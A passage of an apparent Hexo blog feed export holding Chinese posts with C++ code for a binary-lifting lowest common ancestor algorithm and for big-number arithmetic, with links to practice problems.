class="line">        divideImages = cutBackgroundImg(img, m=ROW, n=COL)</span><br><span class="line">        materialList = handleVideoMaterial(needNum=<span class="number">3000</span>)</span><br><span class="line">        handleBlocks(divideImages, materialList)</span><br><span class="line">    <span class="keyword">elif</span> way == <span class="number">2</span>:</span><br><span class="line">        divideImages = cutBackgroundImg(img, m=ROW, n=COL)</span><br><span class="line">        materialList = handlePictures()</span><br><span class="line">        handleBlocks(divideImages, materialList)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>OpenCV</tag>
        <tag>图像</tag>
      </tags>
  </entry>
  <entry>
    <title>利用倍增的思想实现LCA算法</title>
    <url>/2021/05/27/%E5%88%A9%E7%94%A8%E5%80%8D%E5%A2%9E%E7%9A%84%E6%80%9D%E6%83%B3%E5%AE%9E%E7%8E%B0LCA%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>LCA</code>算法指的是最近公共祖先（<code>Lowest Common Ancestor</code>），这里的最近指的是给定的两个点中所有的公共祖先中，距离根节点最远的节点，而且这两点到最近公共祖先的距离只和也是这两点之间的最短路径。<a id="more"></a></p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>实现该算法一般是借助每个节点的深度信息进行求解，具体为：</p>
<p>假设要求<code>x</code>和<code>y</code>的<code>LCA</code> ，不妨假设<code>depth[x] &gt; depth[y]</code>，我们先让<code>x</code>往上跳（朝着根的方向），直到二者的深度相同，然后<code>x</code>和<code>y</code>同时网上跳，最终二者一定会在某一点相遇，这点就是所求。</p>
<p>这也叫朴素实现方法，当一棵树深度很大，查询点都是比较深的时候，此时在网上跳的过程会花费大量的时间，时间复杂度是<code>O(n)</code>。</p>
<p>而倍增思想解决的是，优化向上跳转的过程，每次尽可能地往上跳更多的距离。</p>
<p>相关代码说明请看代码注释：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">// const int MAX_N = 5e5 + 1, MAX_M = 5e5 + 1;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_N = <span class="number">5e2</span> + <span class="number">1</span>, MAX_M = <span class="number">5e2</span> + <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> v, next;</span><br><span class="line">&#125;edges[MAX_M &lt;&lt; <span class="number">1</span>];</span><br><span class="line"><span class="comment">// head[] 节点i的第一条边，depth[] 节点的深度, f[][] 第i号节点的第2^j个祖先</span></span><br><span class="line"><span class="keyword">int</span> head[MAX_N], edgeNum = <span class="number">1</span>, depth[MAX_N], f[MAX_N][<span class="number">22</span>], n;</span><br><span class="line"><span class="comment">// 预处理 log2(i) 向下取整的值</span></span><br><span class="line"><span class="keyword">int</span> lg2[MAX_N];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preLg2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    lg2[<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>; i &lt;= n; ++i) </span><br><span class="line">	  lg2[i] = lg2[i - <span class="number">1</span>] + (<span class="number">2</span> &lt;&lt; lg2[i - <span class="number">1</span>] == i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 采用链式前向星方式模拟链表</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> u, <span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line">    edges[edgeNum].v = v, edges[edgeNum].next = head[u];</span><br><span class="line">    head[u] = edgeNum++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 快速读入，可理解为 scanf()</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> ch = getchar();</span><br><span class="line">    <span class="keyword">while</span> (ch &lt; <span class="string">'0'</span>  || ch &gt; <span class="string">'9'</span>)ch = getchar();</span><br><span class="line">    <span class="keyword">while</span> (ch &lt;= <span class="string">'9'</span> &amp;&amp; ch &gt;= <span class="string">'0'</span>)&#123;</span><br><span class="line">        sum = (sum &lt;&lt; <span class="number">1</span>)  + (sum &lt;&lt; <span class="number">3</span>) + ch - <span class="string">'0'</span>;</span><br><span class="line">        ch = getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> nowId, <span class="keyword">int</span> fa)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 第 2 ^ 0 即第一个祖先（从 nowId 往根节点方向）</span></span><br><span class="line">    f[nowId][<span class="number">0</span>] = fa;</span><br><span class="line">    depth[nowId] = depth[fa] + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= lg2[depth[nowId]]; i++)</span><br><span class="line">        <span class="comment">// nowId 的第 2 ^ i 祖先是它的第 2 ^ (i - 1)个祖先的第 2 ^ (i - 1)个祖先</span></span><br><span class="line">        <span class="comment">// 要画图才能理解</span></span><br><span class="line">        f[nowId][i] = f[f[nowId][i - <span class="number">1</span>]][i - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> eId = head[nowId]; eId; eId = edges[eId].next)</span><br><span class="line">        <span class="keyword">if</span> (edges[eId].v != fa)dfs(edges[eId].v, nowId);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lca</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (depth[x] &lt; depth[y])swap(x, y);</span><br><span class="line">    <span class="comment">// 目的是将二者处理到同一个高度</span></span><br><span class="line">    <span class="keyword">while</span> (depth[x] &gt; depth[y])</span><br><span class="line">        <span class="comment">// 以高度差为依据进行跳</span></span><br><span class="line">        x = f[x][lg2[depth[x] - depth[y]]];</span><br><span class="line">    <span class="comment">// 二者相等，毫无疑问，此时 x 就是 y 的祖先</span></span><br><span class="line">    <span class="keyword">if</span>(x == y)<span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> <span class="built_in">step</span> = lg2[depth[x]];<span class="built_in">step</span> &gt;= <span class="number">0</span>; <span class="built_in">step</span>--)</span><br><span class="line">        <span class="keyword">if</span> (f[x][<span class="built_in">step</span>] != f[y][<span class="built_in">step</span>])</span><br><span class="line">            x = f[x][<span class="built_in">step</span>], y = f[y][<span class="built_in">step</span>];</span><br><span class="line">    <span class="keyword">return</span> f[x][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    n = <span class="built_in">read</span>();</span><br><span class="line">    <span class="keyword">int</span> m = <span class="built_in">read</span>(), s = <span class="built_in">read</span>(), u, v;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)&#123;</span><br><span class="line">        u = <span class="built_in">read</span>(), v = <span class="built_in">read</span>();</span><br><span class="line">        add(u, v), add(v, u);</span><br><span class="line">    &#125;</span><br><span class="line">    preLg2();</span><br><span class="line">    dfs(s, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++)&#123;</span><br><span class="line">        u = <span class="built_in">read</span>(), v = <span class="built_in">read</span>();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, lca(u, v));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">5 5 4</span></span><br><span class="line"><span class="comment">3 1</span></span><br><span class="line"><span class="comment">2 4</span></span><br><span class="line"><span class="comment">5 1</span></span><br><span class="line"><span class="comment">1 4</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2 4</span></span><br><span class="line"><span class="comment">3 2</span></span><br><span class="line"><span class="comment">3 5</span></span><br><span class="line"><span class="comment">1 2</span></span><br><span class="line"><span class="comment">4 5</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>题目参考：<a href="https://www.luogu.com.cn/problem/P3379" target="_blank" rel="noopener">洛谷P3397</a></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>倍增思想</tag>
      </tags>
  </entry>
  <entry>
    <title>高精度运算</title>
    <url>/2021/05/06/%E9%AB%98%E7%B2%BE%E5%BA%A6%E8%BF%90%E7%AE%97/</url>
    <content><![CDATA[<blockquote>
<p>本文所探讨的均为高精度数字对高精度数字进行的操作（除特殊说明外）、尚未讨论负数的情况、数字的最低位保存在数组下标<code>0</code>处、尚未进行压位操作（除特殊说明）</p>
</blockquote>
<a id="more"></a>

<h2 id="加法"><a href="#加法" class="headerlink" title="加法"></a>加法</h2><p>关键代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len3; i++)&#123;</span><br><span class="line">    ans[i] += num1[i] + num2[i];</span><br><span class="line">    <span class="comment">// 传递进位</span></span><br><span class="line">    ans[i + <span class="number">1</span>] += ans[i] / <span class="number">10</span>;</span><br><span class="line">    ans[i] %= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>练手题目：<a href="https://www.luogu.com.cn/problem/P1601" target="_blank" rel="noopener">洛谷1601</a></p>
<p><code>AC</code>代码:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> num1[<span class="number">505</span>] = &#123;<span class="number">0</span>&#125;, num2[<span class="number">505</span>] = &#123;<span class="number">0</span>&#125;, ans[<span class="number">505</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> len1, len2, len3;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">2001</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len1 = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++) num1[i] = buff[len1 - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len2 = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len2; i++) num2[i] = buff[len2 - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    len3 = len1 &gt; len2 ? len1 : len2;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len3; i++)&#123;</span><br><span class="line">        ans[i] += num1[i] + num2[i];</span><br><span class="line">        <span class="comment">// 传递进位</span></span><br><span class="line">        ans[i + <span class="number">1</span>] += ans[i] / <span class="number">10</span>;</span><br><span class="line">        ans[i] %= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ans[len3] != <span class="number">0</span>)len3++;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len3 - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)<span class="built_in">printf</span>(<span class="string">"%d"</span>, ans[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="减法"><a href="#减法" class="headerlink" title="减法"></a>减法</h2><p>关键代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++)&#123;</span><br><span class="line">    ans[i] += big[i] - sml[i];</span><br><span class="line">    <span class="comment">// 产生借位</span></span><br><span class="line">    <span class="keyword">if</span> (ans[i] &lt; <span class="number">0</span>)ans[i + <span class="number">1</span>]--, ans[i] += <span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>练手题目：<a href="https://www.luogu.com.cn/problem/P2142" target="_blank" rel="noopener">洛谷2142</a></p>
<p><code>AC</code>代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="comment">// 判断两个数字的大小关系</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> len1, <span class="keyword">int</span> len2, <span class="keyword">int</span> num1[], <span class="keyword">int</span> num2[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(len1 != len2)<span class="keyword">return</span> len1 &gt; len2;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len1 - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        <span class="keyword">if</span> (num1[i] != num2[i])<span class="keyword">return</span> num1[i] &gt; num2[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> big[], <span class="keyword">int</span> len1, <span class="keyword">int</span> sml[], <span class="keyword">int</span> len2, <span class="keyword">bool</span> positive)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans[<span class="number">10090</span>];</span><br><span class="line">    <span class="built_in">memset</span>(ans, <span class="number">0</span>, <span class="keyword">sizeof</span> ans);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++)&#123;</span><br><span class="line">        ans[i] += big[i] - sml[i];</span><br><span class="line">        <span class="keyword">if</span> (ans[i] &lt; <span class="number">0</span>)ans[i + <span class="number">1</span>]--, ans[i] += <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (len1 &gt;= <span class="number">1</span> &amp;&amp; ans[len1 - <span class="number">1</span>] == <span class="number">0</span>)len1--;</span><br><span class="line">    <span class="keyword">if</span> (len1 == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!positive) <span class="built_in">printf</span>(<span class="string">"-"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len1 - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)<span class="built_in">printf</span>(<span class="string">"%d"</span>, ans[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num1[<span class="number">10090</span>], num2[<span class="number">10090</span>];</span><br><span class="line">    <span class="built_in">memset</span>(num1, <span class="number">0</span>, <span class="keyword">sizeof</span> num1);</span><br><span class="line">    <span class="built_in">memset</span>(num2, <span class="number">0</span>, <span class="keyword">sizeof</span> num2);</span><br><span class="line">    <span class="keyword">int</span> len1, len2, len3;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">10090</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len1 = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++) num1[i] = buff[len1 - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len2 = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len2; i++) num2[i] = buff[len2 - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    <span class="keyword">if</span> (cmp(len1, len2, num1, num2))sub(num1, len1, num2, len2, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">else</span> sub(num2, len2, num1, len1, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="乘法"><a href="#乘法" class="headerlink" title="乘法"></a>乘法</h2><p>关键代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; len2; j++)&#123;</span><br><span class="line">        <span class="comment">// 相当于往左偏移</span></span><br><span class="line">        ans[i + j] += num1[i] * num2[j];</span><br><span class="line">        ans[i + j + <span class="number">1</span>] += ans[i + j] / <span class="number">10</span>;</span><br><span class="line">        ans[i + j]  %= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>练手题目：<a href="https://www.luogu.com.cn/problem/P1303" target="_blank" rel="noopener">洛谷1303</a></p>
<p><code>AC</code>代码:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> num1[<span class="number">2010</span>] = &#123;<span class="number">0</span>&#125;, num2[<span class="number">2010</span>] = &#123;<span class="number">0</span>&#125;, ans[<span class="number">4020</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> len1, len2, len3;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">2001</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len1 = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++)num1[i] = buff[len1 - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len2 = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len2; i++)num2[i] = buff[len2 - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; len2; j++)&#123;</span><br><span class="line">            ans[i + j] += num1[i] * num2[j];</span><br><span class="line">            ans[i + j + <span class="number">1</span>] += ans[i + j] / <span class="number">10</span>;</span><br><span class="line">            ans[i + j]  %= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    len3 = len1 + len2;</span><br><span class="line">    <span class="keyword">while</span>(ans[len3 - <span class="number">1</span>] == <span class="number">0</span> &amp;&amp; len3 &gt;= <span class="number">1</span>)len3--;</span><br><span class="line">    <span class="keyword">if</span> (len3 == <span class="number">0</span>)<span class="keyword">return</span> (<span class="built_in">printf</span>(<span class="string">"0"</span>),<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len3 - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)<span class="built_in">printf</span>(<span class="string">"%d"</span>, ans[i]);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="除法"><a href="#除法" class="headerlink" title="除法"></a>除法</h2><h3 id="高精度对高精度"><a href="#高精度对高精度" class="headerlink" title="高精度对高精度"></a>高精度对高精度</h3><p>emm，高精度除高精度的确写起来有点棘手，而且普通版本的时间复杂度达到了<code>O(n^2)</code></p>
<p>原理还是模拟小学二年级的竖式除法</p>
<p>练习题目：<a href="http://ybt.ssoier.cn:8088/problem_show.php?pid=1308" target="_blank" rel="noopener">一本通1308</a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> len1, <span class="keyword">int</span> len2, <span class="keyword">int</span> num1[], <span class="keyword">int</span> num2[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(len1 != len2)<span class="keyword">return</span> len1 - len2;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len1 - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        <span class="keyword">if</span> (num1[i] != num2[i])<span class="keyword">return</span> num1[i] - num2[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> big[], <span class="keyword">int</span> &amp;len1, <span class="keyword">int</span> sml[], <span class="keyword">int</span> len2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++)&#123;</span><br><span class="line">        big[i] = big[i] - sml[i];</span><br><span class="line">        <span class="keyword">if</span> (big[i] &lt; <span class="number">0</span>)big[i + <span class="number">1</span>]--, big[i] += <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(len1 &gt;= <span class="number">1</span> &amp;&amp; big[len1 - <span class="number">1</span>] == <span class="number">0</span>)len1--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">numcpy</span><span class="params">(<span class="keyword">int</span> src[], <span class="keyword">int</span> len1, <span class="keyword">int</span> dest[], <span class="keyword">int</span> &amp;len2, <span class="keyword">int</span> startIndex)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 将 除数 扩展，即除数和被除数高位对齐</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++)dest[startIndex + i] = src[i];</span><br><span class="line">    len2 = len1 + startIndex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// a / b, 结束后a[] 中是余数，ans[]是商</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">div</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> len1, <span class="keyword">int</span> b[], <span class="keyword">int</span> len2, <span class="keyword">int</span> ans[], <span class="keyword">int</span> &amp;len3)</span></span>&#123;</span><br><span class="line">    <span class="comment">// temp用于扩展除数</span></span><br><span class="line">    <span class="keyword">int</span> temp[<span class="number">305</span>], tempLen;</span><br><span class="line">    len3 = len1 - len2 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len3 - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="keyword">sizeof</span> temp);</span><br><span class="line">        numcpy(b, len2, temp, tempLen, i);</span><br><span class="line">        <span class="keyword">while</span>(cmp(len1, tempLen, a, temp) &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">            ans[i]++;</span><br><span class="line">            sub(a, len1, temp, tempLen);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> ans[], <span class="keyword">int</span> len1)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(len1 &gt;= <span class="number">1</span> &amp;&amp; ans[len1 - <span class="number">1</span>] == <span class="number">0</span>)len1--;</span><br><span class="line">    <span class="keyword">if</span> (len1 == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = len1 - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)<span class="built_in">printf</span>(<span class="string">"%d"</span>, ans[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num1[<span class="number">305</span>], num2[<span class="number">305</span>], ans[<span class="number">305</span>], len1, len2, len3;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">305</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len1 = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++) num1[i] = buff[len1 - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len2 = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len2; i++) num2[i] = buff[len2 - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(ans, <span class="number">0</span>, <span class="keyword">sizeof</span> ans);</span><br><span class="line">    div(num1, len1, num2, len2, ans, len3);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(ans, len3);</span><br><span class="line">    <span class="built_in">print</span>(num1, len2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>或者使用<a href="https://zhuanlan.zhihu.com/p/26756957" target="_blank" rel="noopener"> <code>Newton Division</code>方法</a>，时间复杂度可以降到<code>O(nlog(n))</code>，emm，但是这个方法有点复杂，我不是很看得懂。</p>
